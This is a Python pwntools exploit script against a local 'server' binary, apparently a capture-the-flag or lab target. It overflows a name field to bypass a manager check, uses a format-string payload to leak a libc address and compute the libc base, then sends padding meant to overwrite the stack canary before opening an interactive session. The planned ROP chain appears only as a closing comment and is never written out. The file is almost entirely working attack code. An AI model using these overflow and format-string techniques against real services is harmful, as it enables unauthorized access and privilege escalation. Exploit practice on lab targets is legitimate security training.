from pwn import *

# Load Context, binary, libc
context.terminal = ['tmux','splitw' ,'-h']
context.binary = "./server"
binary = ELF("server")
libc = ELF("./libc.so.6")

p = remote("127.0.0.1", 1337)
#p = process("./server")
#p = gdb.debug("./server", '''
#break *main
#''')

# Start Server
p.recvline()

# Name
# 16 bytes allows to be written, overwriting manager check procedure.
# leads to privilege escalation
p.sendline(b"AAAABBBBCCCCDDDD")
p.recvline()

# Clear reservations.txt file for clean leak
p.sendline(b"6")
p.recvline()

# Reserve table
p.sendline(b"1")
p.recvline()

# People count = 8 bytes
# %1$p = stack leak
# %2$p = libc.so.6 leak
# %5$p = random address leak
# %6$p = stack leak
# %8$p = heap fd leak
# %9$p = stack leak

p.sendline(b"%2$p")
p.recvline()
p.recvline()

p.sendline(b"5")
p.recvuntil(b"Table for ")

# libc leak
mem_leak = p.recvuntil(b"\n")
libc_leak = int(mem_leak, 16)
libc_base = libc_leak - 884631
stack_canary_leak = libc_base - 166040

print("libc leak: ", hex(libc_leak))
print("libc base leak: ", hex(libc_base))
print("stack canary leak: ", hex(stack_canary_leak))

p.sendline(b"2")
p.recvline()


padA = b"A" * 255
p.sendline(padA)
p.recvline()

p.sendline(b"y")
p.recvline()


pause()
padB = b"B" * 8     # Padding
padC = b"C" * 8     # Stack Canary Overwrite
padD = b"D" * (255 - len(padC))


exploit  = padB
exploit += padC
exploit += padD

p.sendline(exploit)
p. interactive()

# ROP libc.so.6 using base address + rop gadget offset


